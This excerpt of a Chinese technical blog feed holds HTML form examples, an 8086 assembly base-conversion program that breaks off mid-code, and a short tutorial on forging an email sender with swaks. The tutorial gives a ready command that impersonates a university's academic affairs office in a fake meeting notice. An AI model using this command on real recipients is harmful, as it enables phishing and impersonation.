class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;td&gt;单元格3&lt;/td&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>单元格5<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;td&gt;单元格6&lt;/td&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;td&gt;单元格7&lt;/td&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;td&gt;单元格8&lt;/td&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;td&gt;单元格9&lt;/td&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="label"><a href="#label" class="headerlink" title="label"></a>label</h3><p>标签，点击该元素会跳转到其绑定元素，通过<strong>id</strong>进行绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- form包裹的内容会在submit按钮之后全部提交 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- input中的name是url中的参数名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="radio"><a href="#radio" class="headerlink" title="radio"></a>radio</h3><p>单选，name一样的radio是互斥的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;cpp&quot;</span>&gt;</span>cpp<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lang&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cpp&quot;</span> <span class="attr">value</span>=<span class="string">&quot;cpp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;python&quot;</span>&gt;</span>python<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lang&quot;</span> <span class="attr">id</span>=<span class="string">&quot;python&quot;</span> <span class="attr">value</span>=<span class="string">&quot;python&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;go&quot;</span>&gt;</span>go<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lang&quot;</span> <span class="attr">id</span>=<span class="string">&quot;go&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h3><p>多行的输入框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">id</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;2&quot;</span> <span class="attr">placeholde</span>=<span class="string">&quot;评论&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>选项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;man&quot;</span>&gt;</span>man<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;woman&quot;</span>&gt;</span>woman<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单伪造邮件发件人</title>
      <link href="/post/2db28f9b.html"/>
      <url>/post/2db28f9b.html</url>
      
        <content type="html"><![CDATA[<h2 id="使用Swaks伪造邮件发件人"><a href="#使用Swaks伪造邮件发件人" class="headerlink" title="使用Swaks伪造邮件发件人"></a>使用Swaks伪造邮件发件人</h2><h3 id="安装Swaks"><a href="#安装Swaks" class="headerlink" title="安装Swaks"></a>安装Swaks</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install swaks</span><br></pre></td></tr></table></figure><h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><p>使用命令<code>swaks --to &lt;测试邮箱&gt;</code>对目标邮箱的状态进行测试。</p><p><img src="https://s11.ax1x.com/2023/12/19/piIIYPs.jpg" alt="wps1"> </p><p>从图中可以看出，返回<strong>250ok</strong>，说明该邮箱存在，并且可以正常收信。</p><p><img src="https://s11.ax1x.com/2023/12/19/piIIG5j.jpg" alt="wps2"> </p><p>从上图可以看出，最后返回<strong>550</strong>报错，这是因为没有使用授权码导致<strong>SPF</strong>校验不通过。</p><h3 id="获取授权码"><a href="#获取授权码" class="headerlink" title="获取授权码"></a>获取授权码</h3><p>以163邮箱为例，点击首页的设置选项，选择<code>POP3/SMTP3IMAP</code></p><p><img src="https://s11.ax1x.com/2023/12/19/piII8aQ.jpg" alt="wps3"> </p><p>开启下方两个服务并记录生成的授权码<img src="https://s11.ax1x.com/2023/12/19/piII3Vg.jpg" alt="wps4"></p><h3 id="伪造发件人和内容"><a href="#伪造发件人和内容" class="headerlink" title="伪造发件人和内容"></a>伪造发件人和内容</h3><p>构造邮件内容，使用163邮箱发送邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to &lt;目标邮箱&gt; --from &lt;163的邮箱&gt; --h-From: <span class="string">&#x27;教务处 &lt;admin@cqupt.eud.cn&gt;&#x27;</span> --body <span class="string">&quot;今晚九点学生处开会。&quot;</span> --server smtp.163.com -p 25 -au &lt;163的邮箱&gt; -ap 授权码</span><br></pre></td></tr></table></figure><h3 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h3><p>手机端通知栏看到的效果</p><p><img src="https://s11.ax1x.com/2023/12/19/piIItGn.jpg" alt="wps5"> </p><p>手机端QQ邮箱看到的效果</p><p><img src="https://s11.ax1x.com/2023/12/19/piIIdMV.png" alt="wps6"> </p><p>PC端通知栏看到的效果</p><p><img src="https://s11.ax1x.com/2023/12/19/piIIN2q.jpg" alt="wps7"> </p><p>PC端QQ邮箱看到的效果</p><p><img src="https://s11.ax1x.com/2023/12/19/piIIUx0.jpg" alt="wps8"> </p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>从图中可以看到，在发件人的下方有一栏显示该邮件是由dqy1016751306@163.com代发，且QQ邮箱检测到了该邮件的实际发件人和声明发件人不一致并给出了警告。后续可以尝试自行搭建邮件服务器解决。</p>]]></content>
      
      
      <categories>
          
          <category> 邮件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 邮件伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编实现进制转换和显存输出</title>
      <link href="/post/43fda7c0.html"/>
      <url>/post/43fda7c0.html</url>
      
        <content type="html"><![CDATA[<h2 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h2><ul><li>键盘输入任意小于65536的数字，输出对应二进制、八进制、十六进制形式；</li><li>自定义字体颜色、背景色以及输出在显存的位置；</li><li>对输入数据执行去除前缀零、长度校验、大小校验等处理，并对累加过程中的五位数加法溢出进行过滤；</li><li>数据无效或累加过程出现溢出允许用户重新输入；</li><li>允许用户对合法数据进行连续累加。</li></ul><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br></pre></td><td class="code"><pre><span class="line">DATA SEGMENT</span><br><span class="line">    MYSTR       DB 20H DUP(?)                                                                      ; FFFF = 65535</span><br><span class="line">    NEWSTR      DB 20H DUP(?)                                                                      ; 待增加的数字</span><br><span class="line">    MSG         DB &#x27;Please input your number: $&#x27;</span><br><span class="line">    ADD_MSG     DB &#x27;Input the number you wanna add: $&#x27;</span><br><span class="line">    OUTPUT_B    DB &#x27;The Binary form is: &#x27;                                                          ; 20 + 16(MAX)</span><br><span class="line">    OUTPUT_O    DB &#x27;The Octal  form is: &#x27;                                                          ; 20 + 6</span><br><span class="line">    OUTPUT_H    DB &#x27;The Hex    form is: &#x27;                                                          ; 20 + 4</span><br><span class="line">    ERROR_MSG   DB &#x27;ERROR: Your input is invalid, please enter an integer between 0 and 65535$&#x27;</span><br><span class="line">    AGAIN       DB &#x27;Enter Y/y to continue Or any other letter to exit:$&#x27;</span><br><span class="line">    ADDMORE     DB &#x27;Enter Y/y to continue to add a new number Or any other letter to exit:$&#x27;</span><br><span class="line">    MAX_NUM     DB &#x27;65535&#x27;</span><br><span class="line">    RES         DW 0                                                                               ; 字符串转换后的结果</span><br><span class="line">    NEWLINE     DB 0AH, 0DH, &#x27;$&#x27;</span><br><span class="line">    CLEAR       DB 4000 DUP(&#x27; &#x27;), &#x27;$&#x27;</span><br><span class="line">    FRAME_CHAR  DB &#x27;*&#x27;</span><br><span class="line">    COLOR_MSG   DB 24h                                                                             ; 绿底红字</span><br><span class="line">    COLOR_NUM   DB 4Ah                                                                             ; 红底绿字高亮</span><br><span class="line">    COLOR_FRAME DB 1CH                                                                             ; 蓝底红字高亮</span><br><span class="line">DATA ENDS</span><br><span class="line"></span><br><span class="line">STACK SEGMENT STACK</span><br><span class="line">          DB  20 DUP(?)</span><br><span class="line">          TOP LABEL WORD    ; 栈顶指针</span><br><span class="line">STACK ENDS</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">                      ASSUME CS: CODE, DS: DATA, SS: STACK</span><br><span class="line">    START:            </span><br><span class="line">                      MOV    AX, DATA</span><br><span class="line">                      MOV    DS, AX</span><br><span class="line">                      MOV    AX, STACK</span><br><span class="line">                      MOV    SS, AX</span><br><span class="line">                      LEA    SP, TOP</span><br><span class="line">    INPUT:            </span><br><span class="line">                      LEA    DX, MSG                          ; 输出提示信息</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, NEWLINE                      ; 换行</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">                      LEA    DX, MYSTR                        ; 接收输入</span><br><span class="line">                      MOV    BX, DX</span><br><span class="line">                      MOV    AL, 20</span><br><span class="line">                      MOV    DS:[BX], AL                      ; 字符串第一个字节存储最大字符个数</span><br><span class="line">                      MOV    AH, 0AH</span><br><span class="line">                      INT    21H</span><br><span class="line">                      XOR    CH, CH</span><br><span class="line">                      MOV    SI, DX                           ; 字符串存储地址</span><br><span class="line">                      MOV    CL, [SI + 1]                     ; 实际字符个数</span><br><span class="line">                      ADD    SI, 2                            ; 指向第一个字符</span><br><span class="line">    READY:            </span><br><span class="line">                      CALL   CLEAR_FRONT                      ; 消除前缀0</span><br><span class="line">                      CALL   CHECK_LEN                        ; 检测数据长度</span><br><span class="line">                      CALL   CHECK_FIVE_DIGITS                ; 检测五位数是否大于65535</span><br><span class="line">                      SUB    CL, 1                            ; 循环LEN - 1次</span><br><span class="line">                      XOR    DX, DX                           ; 存放和</span><br><span class="line">                      CMP    CL, 0</span><br><span class="line">                      JZ     LAST                             ; 一位数不需要乘, 会导致CX = 0FFH</span><br><span class="line">    STR_TO_NUM:       </span><br><span class="line">                      MOV    BL, [SI]</span><br><span class="line">                      INC    SI</span><br><span class="line">                      SUB    BL, 30H                          ; 不减先加可能会对CF造成影响</span><br><span class="line">                      CALL   CHECK_NUM                        ; 检测每一位数是否合规</span><br><span class="line">                      ADD    DL, BL</span><br><span class="line">                      ADC    DX, 0                            ; 进位</span><br><span class="line">                      MOV    AX, 0AH</span><br><span class="line">                      MUL    DX</span><br><span class="line">                      MOV    DX, AX</span><br><span class="line">                      LOOP   STR_TO_NUM</span><br><span class="line">    LAST:             </span><br><span class="line">                      MOV    BL, [SI]</span><br><span class="line">                      SUB    BL, 30H                          ; 不减先加可能会对CF造成影响</span><br><span class="line">                      CALL   CHECK_NUM                        ; 检测每一位数是否合规</span><br><span class="line">                      MOV    AL, [SI]</span><br><span class="line">                      SUB    AL, 30H</span><br><span class="line">                      ADD    DL, AL                           ; 最后一个数不用乘</span><br><span class="line">                      ADC    DX, 0</span><br><span class="line">                      MOV    RES, DX</span><br><span class="line">    CLEAN:            </span><br><span class="line">                      LEA    DX, CLEAR                        ; 清空整页</span><br><span class="line">                      MOV    AH, 09H</span><br><span class="line">                      INT    21H</span><br><span class="line">    FRAME_UP:         </span><br><span class="line">                      MOV    AX, 0B866H                       ; 跳过前10行，跳过21个字符(80 - 36 - 2 &gt;&gt; 1)</span><br><span class="line">                      MOV    ES, AX</span><br><span class="line">                      LEA    SI, FRAME_CHAR</span><br><span class="line">                      MOV    DI, 0AH                          ; 偏移地址</span><br><span class="line">                      MOV    CX, 38                           ; 38个&#x27;*&#x27;</span><br><span class="line">    PAINT_FRAME_UP:   </span><br><span class="line">                      MOV    AL, 